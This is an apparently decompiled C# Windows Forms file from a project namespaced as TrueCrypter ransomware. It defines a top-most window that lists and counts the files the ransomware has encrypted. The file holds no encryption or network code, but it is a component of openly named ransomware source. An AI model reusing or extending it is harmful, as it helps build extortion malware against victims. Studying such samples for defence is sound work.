using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace TrueCrypter.Ransomware.Core.Forms;

public class frmFiles : Form
{
	private IContainer components = null;

	private ListBox listFiles;

	public frmFiles(List<string> Files)
	{
		InitializeComponent();
		((ListControl)listFiles).set_DataSource((object)Files);
		((Control)this).set_Text("Encrypted files: " + Files.Count);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmFiles));
		listFiles = new ListBox();
		((Control)this).SuspendLayout();
		((Control)listFiles).set_Dock((DockStyle)5);
		((ListControl)listFiles).set_FormattingEnabled(true);
		listFiles.set_HorizontalScrollbar(true);
		((Control)listFiles).set_Location(new Point(0, 0));
		((Control)listFiles).set_Name("listFiles");
		((Control)listFiles).set_Size(new Size(433, 191));
		((Control)listFiles).set_TabIndex(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(433, 191));
		((Control)this).get_Controls().Add((Control)(object)listFiles);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_MinimumSize(new Size(230, 140));
		((Control)this).set_Name("frmFiles");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Encrypted files: 0");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
	}
}
